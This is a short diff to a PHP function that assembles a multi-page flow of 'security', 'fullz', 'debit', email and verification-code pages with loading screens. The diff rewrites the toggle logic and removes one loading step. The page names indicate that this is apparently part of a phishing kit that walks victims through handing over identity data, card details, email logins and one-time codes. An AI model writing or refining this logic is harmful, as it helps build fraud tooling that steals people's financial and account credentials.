@@ -55,8 +55,8 @@ function h4z3_get_flow_steps()
     global $securitypage, $fullzpage, $debitpage, $mailpage, $codepage;
 
     $steps = [];
-    $mailEnabled = h4z3_is_toggle_enabled($mailpage ?? null);
-    $codeEnabled = $mailEnabled && h4z3_is_toggle_enabled($codepage ?? null);
+    $mailEnabled = false;
+    $codeEnabled = false;
 
     if (h4z3_is_toggle_enabled($securitypage ?? null)) {
         $steps[] = [
@@ -79,25 +79,26 @@ function h4z3_get_flow_steps()
         ];
     }
 
-    if ($mailEnabled) {
+    if (h4z3_is_toggle_enabled($mailpage ?? null)) {
         $steps[] = [
             'key' => 'email',
             'path' => 'mail.php',
         ];
+        $mailEnabled = true;
     }
 
-    if ($codeEnabled) {
+    if ($mailEnabled && h4z3_is_toggle_enabled($codepage ?? null)) {
         $steps[] = [
             'key' => 'loading',
             'path' => 'loading.php',
         ];
+        $codeEnabled = true;
+    }
+
+    if ($mailEnabled && $codeEnabled) {
         $steps[] = [
             'key' => 'code',
             'path' => 'Code.php',
-        ];
-        $steps[] = [
-            'key' => 'loading2',
-            'path' => 'loading2.php',
         ];
     }
 
